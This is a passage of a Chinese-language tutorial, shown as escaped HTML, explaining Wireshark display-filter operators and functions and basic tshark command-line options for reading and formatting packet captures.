          &lt;td style=&#34;text-align: left&#34;&gt;大于或等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len ge 0x100&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;le&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;lt;=&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;小于或等于&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;frame.len &amp;lt;= 0x20&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;contains&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;协议、字段或切片包含某个值&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;sip.To contains &amp;ldquo;a1762&amp;rdquo;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;matches&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;~&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;右侧的正则表达式将被用来匹配左侧的字符串&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;http.host matches &amp;ldquo;acme.(org|com|net)&amp;rdquo;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;span style=&#34;font-size:20px;color:red&#34;&gt;&lt;strong&gt;等于（==）和全等（===）的区别：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;== 是一种宽松的比较，只要有一个值匹配即可（any if more than one）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;=== 是一种严格的比较，所有可能的值都必须匹配（all if more than one）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同一个包，使用等于（==）可以过滤出源或目的端口为80报文，使用全等（===）则会匹配源目的端口都为80的报文&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip.addr &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; 10.0.0.0/8    等价于   ip.src&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8 &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; ip.dst&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip.addr &lt;span style=&#34;color:#56b6c2&#34;&gt;===&lt;/span&gt; 10.0.0.0/8    等价于   ip.src&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8 &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ip.dst&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;10.0.0.0/8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;逻辑运算符&#34;&gt;逻辑运算符
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;操作符&lt;/th&gt;
          &lt;th&gt;类C风格&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
          &lt;th&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;and&lt;/td&gt;
          &lt;td&gt;&amp;amp;&amp;amp;&lt;/td&gt;
          &lt;td&gt;逻辑与&lt;/td&gt;
          &lt;td&gt;ip.src == 10.0.0.5 &lt;strong&gt;and&lt;/strong&gt; tcp.flags.fin == 1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;or&lt;/td&gt;
          &lt;td&gt;||&lt;/td&gt;
          &lt;td&gt;逻辑或&lt;/td&gt;
          &lt;td&gt;ip.src == 10.0.0.5 &lt;strong&gt;or&lt;/strong&gt; ip.src == 192.1.1.1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;xor&lt;/td&gt;
          &lt;td&gt;^^&lt;/td&gt;
          &lt;td&gt;逻辑异或，能且只能满足其中一个&lt;/td&gt;
          &lt;td&gt;tr.dst[0:3] == 0.6.29 &lt;strong&gt;xor&lt;/strong&gt; tr.src[0:3] == 0.6.29&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;not&lt;/td&gt;
          &lt;td&gt;!&lt;/td&gt;
          &lt;td&gt;逻辑非&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;!&lt;/strong&gt; udp&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;[…]&lt;/td&gt;
          &lt;td&gt;不涉及&lt;/td&gt;
          &lt;td&gt;[a:b]：从第a个字符开始取b个字符&lt;/td&gt;
          &lt;td&gt;http.request.method**[0:3]**==&amp;ldquo;GET&amp;rdquo;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;in&lt;/td&gt;
          &lt;td&gt;不涉及&lt;/td&gt;
          &lt;td&gt;匹配集合内的元素，代替==&lt;/td&gt;
          &lt;td&gt;http.request.method &lt;strong&gt;in&lt;/strong&gt; {&amp;ldquo;HEAD&amp;rdquo;, &amp;ldquo;GET&amp;rdquo;}&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;函数&#34;&gt;函数
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;函数&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;upper&lt;/td&gt;
          &lt;td&gt;将字符串字段转换为大写&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;lower&lt;/td&gt;
          &lt;td&gt;将字符串字段转换为小写&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;len&lt;/td&gt;
          &lt;td&gt;返回字符串字段或字节字段的字节长度&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;count&lt;/td&gt;
          &lt;td&gt;返回帧中字段的出现次数&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;string&lt;/td&gt;
          &lt;td&gt;将非字符串字段转换为字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;vals&lt;/td&gt;
          &lt;td&gt;将字段值转换为其值字符串（如果有）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dec&lt;/td&gt;
          &lt;td&gt;将无符号整数字段转换为十进制字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;hex&lt;/td&gt;
          &lt;td&gt;将无符号整数字段转换为十六进制字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;max&lt;/td&gt;
          &lt;td&gt;返回参数的最大值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;min&lt;/td&gt;
          &lt;td&gt;返回参数的最小值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;abs&lt;/td&gt;
          &lt;td&gt;返回参数的绝对值&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;upperlower&#34;&gt;upper()、lower()
&lt;/h3&gt;&lt;p&gt;可以使用这两个函数，将字符串转化为大小写，再进行正则匹配，做到不区分大小写的功能&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lower&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.server&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; ~ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;apache&amp;#34;&lt;/span&gt;  //过滤HTTP响应头的server字段为apache的
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;upper&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.request.method&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; ~ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;post|get&amp;#34;&lt;/span&gt;  //过滤http请求方法为POST或GET
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;len&#34;&gt;len()
&lt;/h3&gt;&lt;p&gt;len()函数将返回字段的字节大小，因此可以和比较操作符配合使用，过滤某个报文字段符合大小要求的报文&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;len&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.request.uri&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;   //过滤http头部的URI字段，大于等于10字节的报文
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;len&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http.host&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;20&lt;/span&gt;    //过滤HTTP主机名大于等于20字节的报文
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;string&#34;&gt;string()
&lt;/h3&gt;&lt;p&gt;当字段为非字符串类型，而又想转换为字符串字段再进行正则匹配时，很方便&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;string&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;ip.addr&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; ~ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;^10|^11&amp;#34;&lt;/span&gt;    //过滤IP为10网段开头或者23网段开头的IP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;string&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;ip.dst&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; matches r&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;^172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.255&amp;#34;&lt;/span&gt;   //匹配目的IP中以255结尾的IP地址&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;172.16到172.31&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;maxmin&#34;&gt;max()、min()
&lt;/h3&gt;&lt;p&gt;max()和min()接受相同类型的任意数量的参数，并分别返回集合中最大/最小的参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;max&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;tcp.srcport,tcp.dstport&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;lt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1024&lt;/span&gt;   //过滤tcp源端口、目的端口，最大不能超过1024的报文
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;min&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;tcp.srcport+tcp.dstport&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt; &amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1024&lt;/span&gt;   //过滤tcp源端口+目的端口大于等于1024的报文
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;过滤ip&#34;&gt;过滤IP
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）源地址为192.168.0.1的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip.src == 192.168.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2）目的地址为192.168.0.1的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip.dst == 192.168.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3）源地址或目的地址是192.168.0.1的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip.addr == 192.168.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要原地址和目标地址一样就用===&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4）排除上述包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;!(表达式)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;过滤协议&#34;&gt;过滤协议
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）仅捕获某种协议的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;直接写协议名即可，如http（区分大小写）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2）捕获多种协议的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用逻辑或&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http or telent
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3）排除某种协议的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用逻辑非&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;not http
! http
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;过滤端口需要指明协议&#34;&gt;过滤端口（需要指明协议）
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）捕获某一端口的包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tcp.port == 80
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2）捕获多端口的包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可以用and来表示多端口并列&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tcp.port == 80 and 8080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也可以用比较运算符&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;udp.port &amp;gt;= 2048
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;过滤长度内容&#34;&gt;过滤长度、内容
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1）长度（数据段的长度）&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;udp.length &amp;gt;= 30                        //udp的payload长度

http.content_length &amp;lt;= 20          //http消息体长度
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2）数据包内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用matches/contains&lt;/p&gt;
&lt;h2 id=&#34;过滤时间&#34;&gt;过滤时间
&lt;/h2&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;frame.time &amp;gt;= &amp;#34;Apr 16, 2021 06:00:00.0&amp;#34; &amp;amp;&amp;amp; frame.time &amp;lt;= &amp;#34;Apr 16, 2021 06:59:00.0&amp;#34;

frame.time &amp;gt; &amp;#34;2024-04-11 11:00:00&amp;#34; and frame.time &amp;lt; &amp;#34;2024-04-11 11:01:00&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意：时间是字符串，要用双引号括起来&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;tshark基本命令&#34;&gt;tshark基本命令
&lt;/h1&gt;&lt;h2 id=&#34;-r--从一个已有的捕获文件读取数据包进行分析&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-r&lt;/span&gt; &amp;ndash; 从一个已有的捕获文件读取数据包进行分析
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-r 111.pcap&lt;/code&gt;：**从名为 &lt;code&gt;111.pcap&lt;/code&gt; 的文件中读取数据包并简略打印出来&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1.837951      192.168.1.12 -&amp;gt;192.168.1.5        TCP              72                 8080   -&amp;gt;  45940          [FIN, ACK] Seq=1 ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;​      &lt;strong&gt;时间戳            原IP           目标IP          协议     数据包长度      源端口    目标端口       报文标头信息&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;-n-n--禁止反向解析&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-n/-N&lt;/span&gt; &amp;ndash; 禁止反向解析
&lt;/h2&gt;&lt;h3 id=&#34;-n--禁用域名解析不对-ip-地址和端口号进行名称解析&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;-n&lt;/span&gt; &amp;ndash; 禁用域名解析，不对 IP 地址和端口号进行名称解析
&lt;/h3&gt;&lt;p&gt;默认情况下，&lt;code&gt;tshark&lt;/code&gt; 会尝试将捕获到的 IP 地址解析为主机名（192.168.1.1-&amp;gt;exaple.com），同时也会将端口号转换为服务名称（如 80 变成 &lt;code&gt;http&lt;/code&gt;，443 变成 &lt;code&gt;https&lt;/code&gt; 等）&lt;/p&gt;
&lt;p&gt;通过使用 &lt;code&gt;-n&lt;/code&gt; 参数，可以避免这些解析，直接显示原始的 IP 地址和端口号&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg:&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -r file.pcap   //直接输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.1.1 -&amp;gt; example.com &lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -n -r file.pcap  //-n输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.1.1 -&amp;gt; 93.184.216.34 &lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-n--精准控制解析哪些层级&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;-N&lt;/span&gt; &amp;ndash; 精准控制解析哪些层级
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;格式：-N &amp;lt;反向解析flag1&amp;gt; -N &amp;lt;反向解析flag2&amp;gt;&amp;hellip;&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;flag取值&lt;/th&gt;
          &lt;th&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;d&lt;/td&gt;
          &lt;td&gt;对于DNS包启用解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;m&lt;/td&gt;
          &lt;td&gt;启用MAC地址解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;n&lt;/td&gt;
          &lt;td&gt;启用网络地址解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;N&lt;/td&gt;
          &lt;td&gt;使用外部解析器（例如DNS）进行网络地址解析，n需要被同时启用才有效果&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;t&lt;/td&gt;
          &lt;td&gt;启用传输层端口解析&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;v&lt;/td&gt;
          &lt;td&gt;启用VLAN ID的名称解析&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;span style=&#34;font-size:30px;color:#FF8800&#34;&gt;&lt;strong&gt;eg：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -r file.pcap   //直接输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1.837951 192.168.1.12 -&amp;gt; 192.168.1.5 TCP &lt;span style=&#34;color:#d19a66&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;45940&lt;/span&gt; -&amp;gt; &lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;FIN, ACK&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Seq&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ack&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tshark -N t -r file.pcap  //-N t&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;解析传输层端口&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;输出
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1.837951 192.168.1.12 -&amp;gt; 192.168.1.5 TCP &lt;span style=&#34;color:#d19a66&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;45940&lt;/span&gt; -&amp;gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;(&lt;/span&gt;http&lt;span style=&#34;color:#56b6c2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;FIN, ACK&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Seq&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ack&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                                                            ↑
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;-t--指定输出格式&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-T&lt;/span&gt; &amp;ndash; 指定输出格式
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-T fields&lt;/code&gt;：**仅输出指定的字段（需配合 -e 使用）&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T text&lt;/code&gt;：**以普通文本格式输出（默认）&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T json&lt;/code&gt;：**以 JSON 格式输出&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T jsonraw&lt;/code&gt;：**以 JSON（包含原始数据）格式输出&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-T ek&lt;/code&gt;：**以 ElasticSearch 格式输出&lt;/p&gt;
&lt;h2 id=&#34;-e--指定显示数据包中的特定字段&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-e&lt;/span&gt; &amp;ndash; 指定显示数据包中的特定字段
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;格式：-e &amp;ldquo;字段1&amp;rdquo; -e &amp;ldquo;字段2&amp;rdquo;&amp;hellip;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;ip.src&lt;/code&gt;：**显示源 IP 地址&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;ip.dst&lt;/code&gt;：**显示目标 IP 地址&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;http.host&lt;/code&gt;：**显示 HTTP 请求中的主机名&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;http.request.uri&lt;/code&gt;：**显示 HTTP 请求中的 URI（即请求的 URL 路径）&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;usbhid.data&lt;/code&gt;：**只提取USB HID 设备数据&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;frame.number&lt;/code&gt;：**显示数据包的报文帧数&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;frame.time&lt;/code&gt;：**显示数据包捕获的时间戳&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;frame.len&lt;/code&gt;：**显示数据包的长度&lt;/p&gt;
